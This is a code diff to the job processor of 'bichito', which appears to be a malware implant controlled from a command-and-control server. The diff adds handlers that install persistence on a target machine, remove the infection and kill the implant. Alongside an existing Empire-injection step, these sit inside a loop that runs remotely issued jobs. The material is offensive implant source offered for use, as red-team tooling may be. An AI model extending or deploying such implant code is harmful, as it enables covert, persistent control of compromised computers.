@@ -8,9 +8,11 @@ package main
 
 import (
 	"bichito/modules/biterpreter"
+	"bichito/modules/persistence"
 	"time"
 	"strconv"
 	"strings"
+	"os"
 	//Debug
 	"fmt"
 
@@ -38,14 +40,14 @@ func jobProcessor(){
 	}
 
 	contChannel := make(chan string, 1)
-	biJobTimeout := time.NewTimer(time.Duration(10) * time.Second)
+	biJobTimeout := time.NewTimer(time.Duration(30) * time.Second)
 	var result,timeR string
 	var error bool
 	
 	for _,job := range jobsToProcess.Jobs{
 
 		//Debug:
-		//fmt.Println(job.Job)
+		fmt.Println(job.Job)
 		//Stop buffering pings once we know we are in Hive DB (to reduce overhead)
 		if job.Job == "received"{
 			received = true
@@ -81,6 +83,47 @@ func jobProcessor(){
 		   			result = "TTL changed to "+job.Parameters+" seconds"
 		   			contChannel <- "continue"
 
+		   		case "persistence":
+		   			
+		   			if !persisted {
+
+		   				//Debug
+		   				//fmt.Println("Persisting Job Bichito....")
+
+		   				blob := job.Result
+		   				error,result = persistence.AddPersistence(biconfig.Persistence,blob)
+		   				if error{
+							result = "Error Executing Persistence:"+ result
+						}else{
+							result = "Bichito Already persisted in target bot"+ result
+						}
+
+						//Independently of the result, set persisted to true to avoid endless persistence loop
+						persisted = true
+					}
+
+		   			contChannel <- "continue"
+
+		   		case "removeInfection":
+		   			
+		   			err,res := RemoveInfection()
+		   			//Debug
+		   			//fmt.Println("Persistence Removal Finished...")   			
+		   			
+		   			if err{
+						result = "Error Removing Persistence:"+res
+					}else{
+						result = "Persistence Removed:"+res
+					}
+
+		   			contChannel <- "continue"
+
+		   		case "kill":
+		   			
+		   			os.Exit(1)   			
+
+		   			contChannel <- "continue"
+
 		   		// Implant Basic Capabilities
 		   		case "sysinfo":
 
@@ -108,7 +151,13 @@ func jobProcessor(){
 
 		   		
 		   		case "accesschk":
-		   			error,result = biterpreter.Accesschk(job.Parameters)
+		   			
+		   			arguments := strings.Split(job.Parameters," ")
+    				if len(arguments) != 1 {
+        				result = "Incorrect Number of params"
+    				}
+
+		   			error,result = biterpreter.Accesschk(arguments[0])
 		   			if error{
 						result = "Error Executing Command:"+ result
 					}
@@ -159,7 +208,8 @@ func jobProcessor(){
 					}
 		   			contChannel <- "continue"
 
-		   		//Staging/POST Actions
+
+		   		//Staging/POST Actions - Userland
 		   		case "injectEmpire":
 
 		   			error,result = biterpreter.InjectEmpire(job.Parameters)
@@ -167,6 +217,12 @@ func jobProcessor(){
 						result = "Error Injecting Empire:"+ result
 					}
 		   			contChannel <- "continue"
+
+		   		//Elevate
+
+		   		//SYSTEM Actions
+		   		//Inject other user process, root persistence,...
+
 		   		default:
 		   			result = "Void No Job Inplemented"
 		   			contChannel <- "continue"		
